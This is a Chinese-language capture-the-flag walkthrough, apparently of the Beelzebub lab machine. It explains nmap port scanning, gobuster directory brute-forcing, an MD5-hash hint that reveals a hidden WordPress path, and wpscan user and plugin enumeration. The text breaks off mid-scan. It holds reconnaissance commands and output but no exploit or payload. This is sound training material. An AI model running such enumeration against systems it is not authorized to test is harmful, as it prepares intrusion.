+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan 
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> 192.168.242.230
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.00076s latency<span style="color:#ff6ac1">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">998</span> filtered tcp ports <span style="color:#ff6ac1">(</span>no-response<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff6ac1">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ff9f43">2048</span> 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 <span style="color:#ff6ac1">(</span>RSA<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ff9f43">256</span> 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 <span style="color:#ff6ac1">(</span>ECDSA<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ff9f43">256</span> b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 <span style="color:#ff6ac1">(</span>ED25519<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#ff6ac1">(</span>Ubuntu<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff6ac1">done</span>: <span style="color:#ff9f43">1</span> IP address <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">1</span> host up<span style="color:#ff6ac1">)</span> scanned in 235.55 seconds</span></span></code></pre></div><p>（ps：关闭梯子），<code>-sS</code>是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），<code>-sV</code>是版本探测，<code>-sC</code>(Script)是默认脚本扫描，（<code>-p-</code>是全端口扫描，不用），（<code>-T4</code>(Timing Template)加快频率），<code>-oN namp_full_scan</code>(output noraml)将结果以标准格式保存到名为<code>nmap_full_scan</code>的文件中。
+目标主机有2个开放端口22（SSH）、80（HTTP）</p>
+<h2 id="获得shell">获得shell<a class="anchor" href="#%e8%8e%b7%e5%be%97shell">#</a></h2>
+<p>目标主机openssh 7.6p1没有可利用的版本，接着分析80端口：
+url中输入ip，返回apache2的默认页面，查看源代码没有特别发现</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://192.168.242.230/robots.txt
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#5af78e">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.29 <span style="color:#ff6ac1">(</span>Ubuntu<span style="color:#ff6ac1">)</span> Server at 192.168.242.230 Port 80&lt;/address&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;</span></span></code></pre></div><p>目标站点不存在robots.txt文件，接着进行目录扫描：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff6ac1">(</span>@TheColonial<span style="color:#ff6ac1">)</span> &amp; Christian Mehlmauer <span style="color:#ff6ac1">(</span>@firefart<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Url:                     http://192.168.242.230
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Threads:                 <span style="color:#ff9f43">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Negative Status codes:   <span style="color:#ff9f43">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> User Agent:              gobuster/3.8
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Timeout:                 <span style="color:#ff5c57">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#ff5c57">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 323<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/javascript/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 323<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/phpmyadmin/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff6ac1">(</span>Status: 403<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 280<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ff9f43">220558</span> / <span style="color:#ff9f43">220558</span> <span style="color:#ff6ac1">(</span>100.00%<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span></span></span></code></pre></div><ul>
+<li><code>gobuster</code>是一个Go语言编写的高性能目录爆破工具，<code>dir</code>是目录扫描模式(枚举web服务器山过多隐藏目录、文件，向目标web服务器发送HTTP/HTTPS请求，接收服务器响应码判断目录/文件是否存在)，<code>-u</code>指定URL，<code>-w</code>(&ndash;wordlist)指定字典路径</li>
+<li>gobuster工具扫描出/javascript、/phpmyadmin目录</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.sh,.html
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff6ac1">(</span>@TheColonial<span style="color:#ff6ac1">)</span> &amp; Christian Mehlmauer <span style="color:#ff6ac1">(</span>@firefart<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Url:                     http://192.168.242.230
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Threads:                 <span style="color:#ff9f43">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Negative Status codes:   <span style="color:#ff9f43">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> User Agent:              gobuster/3.8
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Extensions:              txt,sh,html,php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Timeout:                 <span style="color:#ff5c57">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#ff5c57">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#ff6ac1">(</span>Status: 200<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 10918<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#ff6ac1">(</span>Status: 200<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 271<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 323<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/javascript/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 323<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/phpmyadmin/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/phpinfo.php          <span style="color:#ff6ac1">(</span>Status: 200<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 95447<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff6ac1">(</span>Status: 403<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 280<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ff9f43">1102790</span> / <span style="color:#ff9f43">1102790</span> <span style="color:#ff6ac1">(</span>100.00%<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span></span></span></code></pre></div><ul>
+<li>
+<p><code>-x .php,.txt,.sh,.html</code>(-x全写是&ndash;extensions)这条命令拿着<code>directory-list-2.3-medium.txt</code>字典逐一尝试访问靶机，并给每个词条加上<code>.php</code>、<code>.txt</code>、<code>.sh</code>、<code>.html</code>后缀，如字典里的<code>admin</code>，会同时尝试<code>http://192.168.242.230/admin.php</code>、<code>http://192.168.242.230/admin.txt</code>、<code>http://192.168.242.230/admin.sh</code>、<code>http://192.168.242.230/admin.html</code></p>
+</li>
+<li>
+<p>状态码：200代表成功找到这个文件or页面，访问，如：<code>http://192.168.242.230/index.html</code>；301/302代表重定向，通常是真实存在的文件夹，可以访问；403被禁止，有权限看，但服务器不让进，记录下来，通常有敏感内容，需要后续绕过</p>
+</li>
+<li>
+<p>URL后缀加上<code>/index.php</code>，再F12查看页面源代码</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">html</span>&gt;&lt;<span style="color:#ff6ac1">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">title</span>&gt;404 Not Found&lt;/<span style="color:#ff6ac1">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff6ac1">head</span>&gt;&lt;<span style="color:#ff6ac1">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">h1</span>&gt;Not Found&lt;/<span style="color:#ff6ac1">h1</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#78787e">&lt;!--My heart was encrypted, &#34;beelzebub&#34; somehow hacked and decoded it.-md5--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">p</span>&gt;The requested URL was not found on this server.&lt;/<span style="color:#ff6ac1">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">hr</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">address</span>&gt;Apache/2.4.30 (Ubuntu)&lt;/<span style="color:#ff6ac1">address</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff6ac1">body</span>&gt;&lt;/<span style="color:#ff6ac1">html</span>&gt;</span></span></code></pre></div><p>根据HTML注释中提示，提及了beelzebub和md5，暗示需要对beelzebub这个字符串进行MD5哈希加密</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ <span style="color:#ff5c57">echo</span> -n <span style="color:#5af78e">&#39;beelzebub&#39;</span> | md5sum
+</span></span><span style="display:flex;"><span>d18e1e22becbd915b45e0e655429d487  -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ man <span style="color:#ff5c57">echo</span> | grep -e <span style="color:#5af78e">&#39;-n&#39;</span>
+</span></span><span style="display:flex;"><span>       -n     <span style="color:#ff6ac1">do</span> not output the trailing newline</span></span></code></pre></div><ul>
+<li><code>-n</code>()确保计算的是纯粹的字符串<code>beelzebub</code>的哈希值，若不加，则echo在字符串末尾添加一个不可见的换行符，即计算的是<code>beelzebub\n</code>的哈希值</li>
+<li>再用<code>man</code>(manual)手册查证细节，验证不产生换行符，<code>|</code>管道符串联前后命令，传递输出作为输入，<code>grep</code>是文本筛选工具，<code>-e</code>指定后续为匹配模式</li>
+<li>将该值作为目标继续扫描</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://192.168.242.230/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff6ac1">(</span>@TheColonial<span style="color:#ff6ac1">)</span> &amp; Christian Mehlmauer <span style="color:#ff6ac1">(</span>@firefart<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Url:                     http://192.168.242.230/d18e1e22becbd915b45e0e655429d487
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Threads:                 <span style="color:#ff9f43">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Negative Status codes:   <span style="color:#ff9f43">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> User Agent:              gobuster/3.8
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Timeout:                 <span style="color:#ff5c57">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#ff5c57">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 356<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 357<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-includes/<span style="color:#ff6ac1">]</span>                                                                                                                        
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 354<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ff9f43">220558</span> / <span style="color:#ff9f43">220558</span> <span style="color:#ff6ac1">(</span>100.00%<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span></span></span></code></pre></div><ul>
+<li>此时扫描出wordpress(WP)目录，说明在隐藏的MD5目录下，运行着一个完整的WordPress网站</li>
+<li>接下来看是否可用wpscan扫描出用户名或者插件</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e u,p
+</span></span><span style="display:flex;"><span>_______________________________________________________________
+</span></span><span style="display:flex;"><span>         __          _______   _____
+</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">\ \ </span>       / /  __ <span style="color:#5af78e">\ </span>/ ____|
+</span></span><span style="display:flex;"><span>          <span style="color:#5af78e">\ \ </span> /<span style="color:#5af78e">\ </span> / /| |__<span style="color:#ff6ac1">)</span> | <span style="color:#ff6ac1">(</span>___   ___  __ _ _ __ ®
+</span></span><span style="display:flex;"><span>           <span style="color:#5af78e">\ \/</span>  <span style="color:#5af78e">\/</span> / |  ___/ <span style="color:#5af78e">\_</span>__ <span style="color:#5af78e">\ </span>/ __|/ _<span style="color:#5af78e">`</span> | <span style="color:#ff5c57">&#39;</span>_ <span style="color:#5af78e">\
+</span></span></span><span style="display:flex;"><span>            <span style="color:#5af78e">\ </span> /<span style="color:#5af78e">\ </span> /  | |     ____<span style="color:#ff6ac1">)</span> | <span style="color:#ff6ac1">(</span>__| <span style="color:#ff6ac1">(</span>_| | | | |
+</span></span><span style="display:flex;"><span>             <span style="color:#5af78e">\/</span>  <span style="color:#5af78e">\/</span>   |_|    |_____/ <span style="color:#5af78e">\_</span>__|<span style="color:#5af78e">\_</span>_,_|_| |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>         WordPress Security Scanner by the WPScan Team
+</span></span><span style="display:flex;"><span>                         Version 3.8.28
+</span></span><span style="display:flex;"><span>                               
+</span></span><span style="display:flex;"><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span><span style="display:flex;"><span>_______________________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> Updating the Database ...
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> Update completed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scan Aborted: The URL supplied redirects to http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.</span></span></code></pre></div><p><code>-e</code>(&ndash;enumerate)，<code>u,p</code>(users,plugins)。WPScan报错，由于WordPress内部配置的Site URL与当前访问的IP不一致，目标服务器试图将我重定向到坐着原始环境的IP（<code>192.168.1.6</code>）,导致扫描中断，修改命令再尝试</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force
+</span></span><span style="display:flex;"><span>w_______________________________________________________________
+</span></span><span style="display:flex;"><span>         __          _______   _____
+</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">\ \ </span>       / /  __ <span style="color:#5af78e">\ </span>/ ____|
+</span></span><span style="display:flex;"><span>          <span style="color:#5af78e">\ \ </span> /<span style="color:#5af78e">\ </span> / /| |__<span style="color:#ff6ac1">)</span> | <span style="color:#ff6ac1">(</span>___   ___  __ _ _ __ ®
+</span></span><span style="display:flex;"><span>           <span style="color:#5af78e">\ \/</span>  <span style="color:#5af78e">\/</span> / |  ___/ <span style="color:#5af78e">\_</span>__ <span style="color:#5af78e">\ </span>/ __|/ _<span style="color:#5af78e">`</span> | <span style="color:#5af78e">&#39;_ \
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                         Version 3.8.28
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">_______________________________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] URL: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ [192.168.242.230]
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] Started: Mon Jan 19 00:50:56 2026
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">Interesting Finding(s):
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] Headers
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Interesting Entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - Server: Apache/2.4.29 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - X-Redirect-By: WordPress
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Headers (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] XML-RPC seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[+] WordPress readme found: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/readme.html
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e"> | Confidence: 100%
